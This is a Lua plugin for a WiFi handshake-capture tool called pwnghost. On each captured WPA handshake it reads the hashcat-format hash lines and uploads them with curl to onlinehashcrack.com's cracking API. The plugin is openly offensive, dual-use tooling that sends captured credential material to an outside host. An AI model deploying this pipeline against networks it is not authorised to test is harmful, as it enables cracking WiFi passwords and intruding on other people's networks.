-- ohcapi plugin: uploads captured handshakes to onlinehashcrack.com's V2
-- task API.
-- Hooks: on_ready, on_handshake. Available globals on_handshake:
-- `handshake_bssid`, `handshake_ssid`, `handshake_path`.

local CONFIG_PATH = "/etc/pwnghost/config.toml"
local TMP_PAYLOAD = "/var/tmp/pwnghost/ohcapi_payload.json"

local initialized = false
local api_key = nil
local receive_email = "yes"

local function read_config_value(section, key)
  local f = io.open(CONFIG_PATH, "r")
  if not f then
    return nil
  end
  local content = f:read("*a")
  f:close()

  local section_start = content:find("%[" .. section:gsub("%.", "%%.") .. "%]")
  if not section_start then
    return nil
  end

  local body_start = content:find("\n", section_start) or section_start
  local next_section = content:find("\n%[", body_start)
  local body = content:sub(body_start, next_section or #content)

  return body:match(key .. '%s*=%s*"([^"]*)"') or body:match(key .. "%s*=%s*([%d%.]+)")
end

local function init()
  if initialized then
    return
  end
  initialized = true

  api_key = read_config_value("plugins.ohcapi", "api_key")
  receive_email = read_config_value("plugins.ohcapi", "receive_email") or receive_email

  if not api_key or api_key == "" then
    io.stderr:write("[ohcapi] no api_key configured under [plugins.ohcapi]; handshake uploads disabled\n")
  else
    io.stderr:write("[ohcapi] ready, will upload handshakes to onlinehashcrack.com\n")
  end
end

-- Only characters that can plausibly show up in an API key/hashcat line
-- (quotes, backslashes, control chars) need escaping for our hand-rolled
-- JSON -- there's no JSON library available to Lua 5.4 stdlib here.
local function json_escape(s)
  return (s:gsub('[%c"\\]', function(c)
    if c == '"' then
      return '\\"'
    elseif c == "\\" then
      return "\\\\"
    end
    return string.format("\\u%04x", string.byte(c))
  end))
end

function on_ready()
  init()
  return true
end

function on_handshake()
  init()

  if not api_key or api_key == "" then
    return true
  end

  local f = io.open(handshake_path, "r")
  if not f then
    io.stderr:write("[ohcapi] could not read handshake file: " .. tostring(handshake_path) .. "\n")
    return true
  end

  local hashes = {}
  for line in f:lines() do
    if line:match("%S") then
      table.insert(hashes, '"' .. json_escape(line) .. '"')
    end
  end
  f:close()

  if #hashes == 0 then
    io.stderr:write("[ohcapi] no hash lines found in " .. tostring(handshake_path) .. "\n")
    return true
  end

  -- OnlineHashCrack's V2 API takes hashcat 22000-format lines directly, so
  -- no further conversion is needed -- `handshake_path` is already
  -- validated hashcat output from this project's capture pipeline.
  local payload = string.format(
    '{"api_key":"%s","agree_terms":"yes","action":"add_tasks","algo_mode":22000,"hashes":[%s],"receive_email":"%s"}',
    json_escape(api_key), table.concat(hashes, ","), json_escape(receive_email))

  local out = io.open(TMP_PAYLOAD, "w")
  if not out then
    io.stderr:write("[ohcapi] could not write temp payload file " .. TMP_PAYLOAD .. "\n")
    return true
  end
  out:write(payload)
  out:close()

  local cmd = string.format(
    "curl -s -m 30 -o /dev/null -w '%%{http_code}' -X POST -H 'Content-Type: application/json' --data @%s https://api.onlinehashcrack.com/v2 2>/dev/null",
    TMP_PAYLOAD)

  local handle = io.popen(cmd)
  local http_code = handle and handle:read("*a")
  if handle then
    handle:close()
  end
  os.remove(TMP_PAYLOAD)

  if http_code == "200" then
    io.stderr:write(string.format("[ohcapi] uploaded %d hash(es) for %s\n", #hashes, tostring(handshake_ssid)))
  else
    io.stderr:write("[ohcapi] upload failed (http=" .. tostring(http_code) .. ")\n")
  end

  return true
end
